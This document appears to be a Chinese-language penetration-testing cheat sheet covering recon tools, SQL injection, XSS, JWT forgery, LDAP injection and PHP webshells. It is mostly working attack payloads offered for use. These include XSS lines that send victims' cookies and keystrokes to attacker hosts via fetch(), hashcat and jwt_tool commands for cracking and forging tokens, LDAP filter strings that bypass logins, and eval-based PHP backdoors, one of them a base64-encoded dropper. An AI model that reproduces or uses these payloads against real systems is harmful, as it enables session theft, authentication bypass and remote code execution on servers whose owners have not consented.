# 思路
subfinder/amass 子域探测
https://search.censys.io/
https://www.shodan.io/


httpx 进行HTTP测试
模糊测试
当我开始对目录进行模糊测试时，不管状态代码是 200,404 还是 403。大多数时候 Gems 都在这些页面内。
ffuf 工具
模糊测试列表：
/jenkins/script

paramspider/arjun 参数测试
eyewitness 检测url，自动屏幕截图
waybackurls -dates http://xxxx/xxx.php   存档数据
SQL 工具
sqlmap/ghauri
payloads
XOR(if(now()=sysdate(),sleep(9),0))XOR\"Z


# XSS
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>

<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>

</textarea><script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>
<iframe %00 src=\"javascript:prompt(1)\"%00>
<iframe %00 src= javascript:fetch(\"//XXXXXXXXXXXXXXXXXXXXXXXXXXXXX.burpcollaborator.net/?param=\"+document.cookie)  %00>
"><svg onlod=confirm()>
"><sVg/OnLuFy="X=y"oNloaD=;1^confirm(1)>/``¹//
%2522%253E%253CsVg%252FOnLuFy%253D%2522X%253Dy%2522oNloaD%253D%253B1%255Econfirm%25281%2529%253E
<img src=x onerror=alert(document.cookie)>
<href="url" onmouseover=alert(1)>
<iframe %00 src=\"javascript:prompt(1)\"%00>
%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
尝试：
try URL encode
try double URL encode.
try triple URL encode.
try base64 encode.

原型污染是一种javascript漏洞，攻击者可以将任意属性添加到全局变量原型，然后这些属性可能被用户定义的对象继承。

# jwt 
未经验证的签名--忘记验证签名了
越权漏洞等

签名有验证缺陷--NONE算法 alg->none
jwt_tools.py jwt-token -X a

破解弱共享密码
注意：必须是HMAC-SHA算法
jwt_tools.py jwt_token -C -d jwt_secrets.txt
echo jwt_token > jwt_file
hashcat -a 0 -m 16500 jwt_file  jwt_secrets --force

算法混淆攻击 RSA->HS256
构造jwt
jwt editor keys插件
1、获取公钥 public key
/jwks.json  /.well-known/jwks.json等
2、JWT Editor Keys 点击 NEW RSA KEY，复制jwks.json种key的值到jwk框，点击ok
copy public key as PEM 对其base64编码
3、点击new symmetric key 点generate 并替换K的值为pem编码后的值
4、回到请求体jwt，进行sign签名

标头参数住入
Jwk 注入
jwt editor keys插件
New rsa KEY generate
回到请求体jwt，attack embedded jwk
Jku 
jwt editor keys插件
1、生成一个RSA密钥 copy public key as jwk
2、创建一个webserver URL http://xxxx.xxx/jwk
3、回到请求体jwt，修改kid，添加jku,替换sub
kid 注入
jwt editor keys插件
1、生成new symmetric key generate
2、对称密钥 k值覆盖为null (base64编码)
3、回到请求体jwt，修改kid的值为../../../../../../dev/null
4、修改sub,点击 sign 签名


# LDAP
payload:")(cn=))(|(objectClass=*"
"(&(cn=))(|(uid=))(|(objectClass=*))(userpassword=[password])"
login bypass
user=*
password=*
--->(&(user=*)(password=*))
user=*)(&
password=*)(&
-->(&(user=*)(&)(password=*)(&))
user=*)(|(password=*
password=test)
--> (&(user=*)(|(password=*)(password=test))
user=*))%00
pass=any
--> (&(user=*))%00 --> Nothing more is executed
username = admin)(!(&(|
pass = any))
--> (&(uid= admin)(!(& (|) (webpassword=any)))) —> As (|) is FALSE then the user is admin and the password check is True.
username=admin))(|(|
password=any
--> (&(uid=admin)) (| (|) (webpassword=any))

# webshell
.htaccess文件
AddType指定
AddType application/x-httpd-php .png
将.png当作php文件解析
木马
<?php phpinfo(); ?>
<?php 
@eval($_POST['cmd']);
?>
<?php system("whoami"); ?>
<?php
file_put_contents("shell.php","<?php @eval($_POST['cmd']); ?>");
file_put_contents("shell.php",base64_decode("PD9waHAgCkBldmFsKCRfUE9TVFsnY21kJ10pOyAKPz4="));
?>

